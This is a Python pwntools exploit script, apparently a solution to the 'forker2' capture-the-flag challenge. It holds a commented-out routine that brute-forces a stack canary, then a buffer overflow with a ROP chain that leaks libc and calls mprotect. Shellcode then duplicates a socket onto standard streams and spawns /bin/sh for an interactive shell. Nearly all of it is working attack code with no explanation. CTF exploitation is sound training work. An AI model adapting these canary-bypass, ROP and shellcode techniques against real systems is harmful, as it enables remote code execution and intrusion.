from pwn import *

#r = remote("localhost",31337)
#r = remote("forker2.wpictf.xyz", 31337)
context.arch = "amd64"
context.log_level= "error"
"""
secret = "\x00"
for j in range(7):
	print hex(u64(secret.ljust(8,'\x00')))
	for i in range(256):
		print i
		if  i == 0x0a:
			continue
		r = remote("forker2.wpictf.xyz",31337)
		payload = "\x00"*0x48+secret+chr(i)
		r.recvline()
		r.sendline(payload)
		try:
			r.recvline()
		except:
			r.close()
			continue
		secret+=chr(i)
		r.close()
		break

print hex(u64(secret))
exit()
"""

secret = 0xab915d1f79fd8600
secret = 0xa1ee3af73ce33a00
shellcode = asm("""
xor rax,rax
mov al,0x4
push rax
pop rdi
mov al,0x0
push rax
pop rsi
mov al,0x21
syscall
xor rax,rax
mov al,0x4
push rax
pop rdi
mov al,0x1
push rax
pop rsi
mov al,0x21
syscall
mov al,0x4
push rax
pop rdi
mov al,0x2
push rax
pop rsi
mov al,0x21
syscall
xor rdx,rdx
xor rsi,rsi
mov rdi,0x0068732f6e69622f
push rdi
mov rdi,rsp
xor rax,rax
mov al,0x3b
syscall
""")


#r = remote("localhost",31337)
r = remote("forker2.wpictf.xyz", 31337)
payload = "\x00"*0x48+p64(secret)+"\x00"*0x28
payload += flat([0x400bba,0x0,0x1,0x602038,0x4,0x602038,0x0,0x400ba0])
payload += flat([0x0,0x0,0x1,0x0602040,0x4,0x602300,len(shellcode),0x400ba0])
payload += flat([0x0,0x0,0x1,0x0602040,0x4,0x602060,0x8,0x400ba0])
payload += flat([0x0,0x0,0x1,0x602060,0x602000,0x1000,0x7,0x400ba0])
payload += flat([0x0]*7,[0x602300,])
print ("\x0a" in payload)

r.recvline()

r.sendline(payload)
r.recvuntil(":")
libc = u64(r.recvn(6).ljust(8,'\x00'))-0x5d090

print hex(libc)
mprotect = libc+0x10ed40
r.send(shellcode)
r.send(p64(mprotect))
r.interactive()
